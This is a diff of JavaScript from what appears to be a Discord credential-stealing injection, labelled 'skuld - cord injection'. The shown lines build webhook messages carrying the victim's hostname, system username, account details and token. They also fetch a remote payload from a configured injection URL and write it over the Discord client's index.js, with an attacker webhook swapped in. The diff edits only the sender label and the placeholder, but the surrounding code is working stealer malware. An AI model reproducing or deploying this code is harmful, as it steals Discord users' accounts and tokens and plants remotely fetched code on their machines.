@@ -151,7 +151,7 @@ const request = async (method, url, headers, data) => {
 
 const hooker = async (content, token, account) => {
     content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
-    content["username"] = "Share token - email - password";
+    content["username"] = "skuld - cord injection";
     content["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
     content["embeds"][0]["author"] = {
         "name": account.username,
@@ -526,7 +526,7 @@ async function initiation() {
   async function init() {
       https.get('${CONFIG.injection_url}', (res) => {
           const file = fs.createWriteStream(indexJs);
-          res.replace('%WEBHOOK%', '${CONFIG.webhook}')
+          res.replace('hai1723', 'hai1723')
           res.pipe(file);
           file.on('finish', () => {
               file.close();
